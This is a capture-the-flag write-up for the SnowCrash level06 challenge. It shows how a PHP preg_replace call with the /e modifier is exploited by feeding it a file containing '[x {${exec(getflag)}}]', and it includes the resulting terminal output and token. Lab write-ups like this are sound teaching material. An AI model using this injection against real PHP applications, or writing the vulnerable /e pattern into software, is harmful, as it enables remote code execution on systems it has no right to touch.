# level06

When we ls we find a php script and a file that executes the script with a file as argument.
We create a file in the /var/tmp directory and execute the script.
It works, the script print what we put in our txt file in /var/tmp/.
So now let's try to find how to execute "getflag".

First, we tried to exploit `print` function in the script.
Did not work, so we saw this line :

```
$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);
```

The /e execute a command, so we just need to execute our command this way. 
So we tried [e  getflag], "[e  getflag]", [e  `getflag`] but these did not work.
We tried to use the exec command like this :

```
[e  exec(getflag)], [e  exec(`getflag`)]
```

Then with some research, we found that `$` could probably help us.
We tried to understand how Php processes commands and strings.
With researches, we found that the good syntax was :

```
'[x {${exec(getflag)}}]', we just have to put this in /var/tmp/test02
```

When we execute the script with or file as parameter:

```
/*********************************************************\

level06@SnowCrash:~$ ./level06 /var/tmp/test02
PHP Notice: Use of undefined constant getflag - assumed 'getflag' in /home/user/level06/level06.php(4) : regexp code on line 1
PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub in /home/user/level06/level06.php(4) : regexp code on line 1

\*********************************************************/
```